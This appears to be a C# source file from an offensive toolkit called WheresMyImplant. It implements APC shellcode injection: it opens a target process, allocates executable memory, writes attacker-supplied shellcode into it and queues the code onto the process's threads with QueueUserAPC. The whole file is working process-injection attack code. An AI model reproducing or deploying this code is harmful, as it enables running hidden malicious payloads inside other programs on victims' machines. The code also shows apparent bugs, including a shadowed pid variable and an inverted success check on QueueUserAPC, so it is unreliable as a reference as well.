using System;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class InjectShellCodeAPC : IDisposable
    {
        private IntPtr hProcess = IntPtr.Zero;
        private IntPtr hAlloc = IntPtr.Zero;
        private UInt32 pid = 0;
        private IntPtr hSnapshot = IntPtr.Zero;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, ref Int32 dwData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        internal InjectShellCodeAPC()
        {

        }

        internal Boolean OpenProcess(String strProcess)
        {
            if (!UInt32.TryParse(strProcess, out UInt32 pid))
            {
                return false;
            }

            hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_WRITE | ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_OPERATION, false, pid);
            if (IntPtr.Zero == hProcess)
            {
                Console.WriteLine("[-] Unable to Open Process");
                return false;
            }
            return true;
        }

        internal Boolean WriteShellCode(String strShellCode)
        {
            Char DELIMITER = ',';

            String[] shellCodeArray = strShellCode.Split(DELIMITER);
            Byte[] bShellCode = new Byte[shellCodeArray.Length];
            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                bShellCode[i] = Convert.ToByte(value);
            }
            return WriteShellCode(bShellCode);
        }

        internal Boolean WriteShellCode(Byte[] bShellCode)
        {
            hAlloc = kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)bShellCode.Length, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE);
            if (IntPtr.Zero == hAlloc)
            {
                Console.WriteLine("[-] Unable to Allocate Memory");
                return false;
            }

            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(hProcess, hAlloc, bShellCode, (UInt32)bShellCode.Length, ref bytesWritten))
            {
                Console.WriteLine("[-] Unable to Write Memory");
                return false;
            }

            return true;
        }

        internal Boolean CreateThread()
        {
            hSnapshot = kernel32.CreateToolhelp32Snapshot(0x00000004, pid);
            if (IntPtr.Zero == hSnapshot)
            {
                Console.WriteLine("[-] Unable to Create Snapshot");
                return false;
            }

            TiHelp32.tagTHREADENTRY32 lpte = new TiHelp32.tagTHREADENTRY32();
            if (!kernel32.Thread32First(hSnapshot, ref lpte))
            {
                Console.WriteLine("[-] Iteration Start Failed");
                return false;
            }

            do
            {
                IntPtr hThread = kernel32.OpenThread(ProcessThreadsApi.ThreadSecurityRights.THREAD_SET_CONTEXT, false, lpte.th32ThreadID);
                if (IntPtr.Zero != hThread)
                {
                    Console.WriteLine("[+] Suitable Thread Found");
                    if (0 == QueueUserAPC(hAlloc, hThread, IntPtr.Zero))
                    {
                        Console.WriteLine("[+] APC Started");
                        if (0 != kernel32.ResumeThread(hThread))
                        {
                            Console.WriteLine("[-] Failed to Resume Thread");
                            kernel32.CloseHandle(hThread);
                            continue;
                        }
                        kernel32.CloseHandle(hThread);
                        return true;
                    }
                    kernel32.CloseHandle(hThread);
                }
            }
            while (kernel32.Thread32Next(hSnapshot, ref lpte));
            Console.WriteLine("[-] No Candidates Found");
            return false;
        }

        public void Dispose()
        {
            if (IntPtr.Zero != hProcess)
                kernel32.CloseHandle(hProcess);

            if (IntPtr.Zero != hSnapshot)
                kernel32.CloseHandle(hSnapshot);
        }

        ~InjectShellCodeAPC()
        {
            Dispose();
        }
    }
}
